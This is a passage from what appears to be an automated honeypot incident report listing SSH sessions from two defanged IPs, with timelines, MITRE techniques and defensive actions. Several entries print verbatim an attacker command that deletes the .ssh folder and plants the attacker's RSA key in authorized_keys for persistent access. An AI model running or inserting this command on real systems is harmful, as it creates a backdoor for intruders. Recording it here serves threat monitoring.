| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:00:19` | `cowrie.session.connect` |
| `2026-05-15 05:00:19` | `cowrie.client.version` |
| `2026-05-15 05:00:19` | `cowrie.client.kex` |
| `2026-05-15 05:00:19` | `cowrie.login.success` |
| `2026-05-15 05:00:20` | `cowrie.session.params` |
| `2026-05-15 05:00:20` | `cowrie.command.input` |
| `2026-05-15 05:00:20` | `cowrie.command.failed` |
| `2026-05-15 05:00:20` | `cowrie.log.closed` |
| `2026-05-15 05:00:20` | `cowrie.session.params` |
| `2026-05-15 05:00:20` | `cowrie.command.input` |
| `2026-05-15 05:00:20` | `cowrie.session.file_download` |
| `2026-05-15 05:00:20` | `cowrie.log.closed` |
| `2026-05-15 05:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2044e5e443b3

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:00 |
| **Last Seen** | 2026-05-15 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:00:22` | `cowrie.session.connect` |
| `2026-05-15 05:00:22` | `cowrie.client.version` |
| `2026-05-15 05:00:22` | `cowrie.client.kex` |
| `2026-05-15 05:00:23` | `cowrie.login.success` |
| `2026-05-15 05:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c02687da1b5

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:01 |
| **Last Seen** | 2026-05-15 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:01:59` | `cowrie.session.connect` |
| `2026-05-15 05:01:59` | `cowrie.client.version` |
| `2026-05-15 05:01:59` | `cowrie.client.kex` |
| `2026-05-15 05:02:00` | `cowrie.login.success` |
| `2026-05-15 05:02:00` | `cowrie.session.params` |
| `2026-05-15 05:02:00` | `cowrie.command.input` |
| `2026-05-15 05:02:00` | `cowrie.command.failed` |
| `2026-05-15 05:02:00` | `cowrie.log.closed` |
| `2026-05-15 05:02:00` | `cowrie.session.params` |
| `2026-05-15 05:02:00` | `cowrie.command.input` |
| `2026-05-15 05:02:00` | `cowrie.session.file_download` |
| `2026-05-15 05:02:00` | `cowrie.log.closed` |
| `2026-05-15 05:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce320a52c389

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:02 |
| **Last Seen** | 2026-05-15 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:02:03` | `cowrie.session.connect` |
| `2026-05-15 05:02:03` | `cowrie.client.version` |
| `2026-05-15 05:02:03` | `cowrie.client.kex` |
| `2026-05-15 05:02:03` | `cowrie.login.success` |
| `2026-05-15 05:02:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad5d54e9a6d

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:03 |
| **Last Seen** | 2026-05-15 05:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:03:29` | `cowrie.session.connect` |
| `2026-05-15 05:03:29` | `cowrie.client.version` |
| `2026-05-15 05:03:29` | `cowrie.client.kex` |
| `2026-05-15 05:03:29` | `cowrie.login.success` |
| `2026-05-15 05:03:30` | `cowrie.session.params` |
| `2026-05-15 05:03:30` | `cowrie.command.input` |
| `2026-05-15 05:03:30` | `cowrie.command.failed` |
| `2026-05-15 05:03:30` | `cowrie.log.closed` |
| `2026-05-15 05:03:30` | `cowrie.session.params` |
| `2026-05-15 05:03:30` | `cowrie.command.input` |
| `2026-05-15 05:03:30` | `cowrie.session.file_download` |
| `2026-05-15 05:03:30` | `cowrie.log.closed` |
| `2026-05-15 05:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7f388964ef

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:03 |
| **Last Seen** | 2026-05-15 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:03:32` | `cowrie.session.connect` |
| `2026-05-15 05:03:32` | `cowrie.client.version` |
| `2026-05-15 05:03:33` | `cowrie.client.kex` |
| `2026-05-15 05:03:33` | `cowrie.login.success` |
| `2026-05-15 05:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f95e877f27

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:04 |
| **Last Seen** | 2026-05-15 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:04:59` | `cowrie.session.connect` |
| `2026-05-15 05:04:59` | `cowrie.client.version` |
| `2026-05-15 05:04:59` | `cowrie.client.kex` |
| `2026-05-15 05:05:00` | `cowrie.login.success` |
| `2026-05-15 05:05:00` | `cowrie.session.params` |
| `2026-05-15 05:05:00` | `cowrie.command.input` |
| `2026-05-15 05:05:00` | `cowrie.command.failed` |
| `2026-05-15 05:05:00` | `cowrie.log.closed` |
| `2026-05-15 05:05:01` | `cowrie.session.params` |
| `2026-05-15 05:05:01` | `cowrie.command.input` |
| `2026-05-15 05:05:01` | `cowrie.session.file_download` |
| `2026-05-15 05:05:01` | `cowrie.log.closed` |
| `2026-05-15 05:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19668431ae92

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:05 |
| **Last Seen** | 2026-05-15 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:05:03` | `cowrie.session.connect` |
| `2026-05-15 05:05:03` | `cowrie.client.version` |
| `2026-05-15 05:05:03` | `cowrie.client.kex` |
| `2026-05-15 05:05:04` | `cowrie.login.success` |
| `2026-05-15 05:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce4815fc971

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:06 |
| **Last Seen** | 2026-05-15 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:06:28` | `cowrie.session.connect` |
| `2026-05-15 05:06:28` | `cowrie.client.version` |
| `2026-05-15 05:06:28` | `cowrie.client.kex` |
| `2026-05-15 05:06:29` | `cowrie.login.success` |
| `2026-05-15 05:06:29` | `cowrie.session.params` |
| `2026-05-15 05:06:29` | `cowrie.command.input` |
| `2026-05-15 05:06:29` | `cowrie.command.failed` |
| `2026-05-15 05:06:30` | `cowrie.log.closed` |
| `2026-05-15 05:06:30` | `cowrie.session.params` |
| `2026-05-15 05:06:30` | `cowrie.command.input` |
| `2026-05-15 05:06:30` | `cowrie.session.file_download` |
| `2026-05-15 05:06:30` | `cowrie.log.closed` |
| `2026-05-15 05:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cf970317c0f

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:06 |
| **Last Seen** | 2026-05-15 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:06:32` | `cowrie.session.connect` |
| `2026-05-15 05:06:32` | `cowrie.client.version` |
| `2026-05-15 05:06:32` | `cowrie.client.kex` |
| `2026-05-15 05:06:33` | `cowrie.login.success` |
| `2026-05-15 05:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4bb6189b9e7

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:07 |
| **Last Seen** | 2026-05-15 05:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:07:58` | `cowrie.session.connect` |
| `2026-05-15 05:07:58` | `cowrie.client.version` |
| `2026-05-15 05:07:58` | `cowrie.client.kex` |
| `2026-05-15 05:07:58` | `cowrie.login.success` |
| `2026-05-15 05:07:59` | `cowrie.session.params` |
| `2026-05-15 05:07:59` | `cowrie.command.input` |
| `2026-05-15 05:07:59` | `cowrie.command.failed` |
| `2026-05-15 05:07:59` | `cowrie.log.closed` |
| `2026-05-15 05:07:59` | `cowrie.session.params` |
| `2026-05-15 05:07:59` | `cowrie.command.input` |
| `2026-05-15 05:07:59` | `cowrie.session.file_download` |
| `2026-05-15 05:07:59` | `cowrie.log.closed` |
| `2026-05-15 05:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35b7b338b2b3

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:08 |
| **Last Seen** | 2026-05-15 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:08:01` | `cowrie.session.connect` |
| `2026-05-15 05:08:01` | `cowrie.client.version` |
| `2026-05-15 05:08:02` | `cowrie.client.kex` |
| `2026-05-15 05:08:02` | `cowrie.login.success` |
| `2026-05-15 05:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bdedf31da6c

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:10 |
| **Last Seen** | 2026-05-15 05:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:10:39` | `cowrie.session.connect` |
| `2026-05-15 05:10:39` | `cowrie.client.version` |
| `2026-05-15 05:10:39` | `cowrie.client.kex` |
| `2026-05-15 05:10:40` | `cowrie.login.success` |
| `2026-05-15 05:10:40` | `cowrie.session.params` |
| `2026-05-15 05:10:40` | `cowrie.command.input` |
| `2026-05-15 05:10:40` | `cowrie.command.failed` |
| `2026-05-15 05:10:40` | `cowrie.log.closed` |
| `2026-05-15 05:10:41` | `cowrie.session.params` |
| `2026-05-15 05:10:41` | `cowrie.command.input` |
| `2026-05-15 05:10:41` | `cowrie.session.file_download` |
| `2026-05-15 05:10:41` | `cowrie.log.closed` |
| `2026-05-15 05:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b3a909d1b3d

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:10 |
| **Last Seen** | 2026-05-15 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:10:45` | `cowrie.session.connect` |
| `2026-05-15 05:10:45` | `cowrie.client.version` |
| `2026-05-15 05:10:46` | `cowrie.client.kex` |
| `2026-05-15 05:10:46` | `cowrie.login.success` |
| `2026-05-15 05:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e401ff40334b

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:11 |
| **Last Seen** | 2026-05-15 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:11:01` | `cowrie.session.connect` |
| `2026-05-15 05:11:01` | `cowrie.client.version` |
| `2026-05-15 05:11:01` | `cowrie.client.kex` |
| `2026-05-15 05:11:02` | `cowrie.login.success` |
| `2026-05-15 05:11:02` | `cowrie.session.params` |
| `2026-05-15 05:11:02` | `cowrie.command.input` |
| `2026-05-15 05:11:02` | `cowrie.command.failed` |
| `2026-05-15 05:11:03` | `cowrie.log.closed` |
| `2026-05-15 05:11:03` | `cowrie.session.params` |
| `2026-05-15 05:11:03` | `cowrie.command.input` |
| `2026-05-15 05:11:03` | `cowrie.session.file_download` |
| `2026-05-15 05:11:03` | `cowrie.log.closed` |
| `2026-05-15 05:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0897b90500

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:11 |
| **Last Seen** | 2026-05-15 05:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:11:05` | `cowrie.session.connect` |
| `2026-05-15 05:11:05` | `cowrie.client.version` |
| `2026-05-15 05:11:05` | `cowrie.client.kex` |
| `2026-05-15 05:11:06` | `cowrie.login.success` |
| `2026-05-15 05:11:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57b9d09738e1

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:12 |
| **Last Seen** | 2026-05-15 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:12:35` | `cowrie.session.connect` |
| `2026-05-15 05:12:35` | `cowrie.client.version` |
| `2026-05-15 05:12:35` | `cowrie.client.kex` |
| `2026-05-15 05:12:36` | `cowrie.login.success` |
| `2026-05-15 05:12:36` | `cowrie.session.params` |
| `2026-05-15 05:12:36` | `cowrie.command.input` |
| `2026-05-15 05:12:36` | `cowrie.command.failed` |
| `2026-05-15 05:12:36` | `cowrie.log.closed` |
| `2026-05-15 05:12:36` | `cowrie.session.params` |
| `2026-05-15 05:12:36` | `cowrie.command.input` |
| `2026-05-15 05:12:36` | `cowrie.session.file_download` |
| `2026-05-15 05:12:36` | `cowrie.log.closed` |
| `2026-05-15 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c12218af9f0

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:12 |
| **Last Seen** | 2026-05-15 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:12:38` | `cowrie.session.connect` |
